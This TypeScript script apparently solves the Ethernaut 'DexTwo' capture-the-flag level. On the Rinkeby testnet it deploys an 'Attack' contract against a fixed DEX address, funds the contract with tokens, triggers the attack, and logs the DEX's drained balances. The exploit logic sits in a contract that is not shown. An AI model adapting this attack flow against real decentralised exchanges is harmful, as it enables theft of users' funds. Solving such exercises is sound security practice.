import { getDefaultProvider } from '@ethersproject/providers';
import { Wallet, utils } from 'ethers';
import { readFileSync } from 'fs-extra';
import path from 'path/posix';
import { Attack__factory, DexTwo__factory, ERC20__factory } from '../types/ethers-contracts';

// import {  } from '../types/ethers-contracts';

// const provider = getDefaultProvider("http://127.0.0.1:8545");
const provider = getDefaultProvider("rinkeby");
const testPrivKey = readFileSync(path.resolve(__dirname, "./../../../.privkey")).toString().trim();
// const testPrivKey = "";
const addr = "0xB9B25b02ad209cCe6Ac96755874E40C625bF0E03"

function toWei(eth: number) {
  return utils.parseEther(eth.toString())
}

async function main() {
  let alice = new Wallet(testPrivKey);
  alice = alice.connect(provider);

  const dex = DexTwo__factory.connect(addr, provider).connect(alice);
  (new Attack__factory(alice)).deploy(addr).then(async attack => {
    // transfer token
    const token1 = ERC20__factory.connect(await attack.token1(), provider).connect(alice);
    const token2 = ERC20__factory.connect(await attack.token2(), provider).connect(alice);

    await token1.transfer(attack.address, 10)
    await token2.transfer(attack.address, 10)
    
    // start attack
    attack.attack().then(async () => {
      console.log(await dex.balanceOf(await dex.token1(), addr))
      console.log(await dex.balanceOf(await dex.token2(), addr))
    })
  })

}

main().catch(e => {
  console.log("Error: " + e)
})
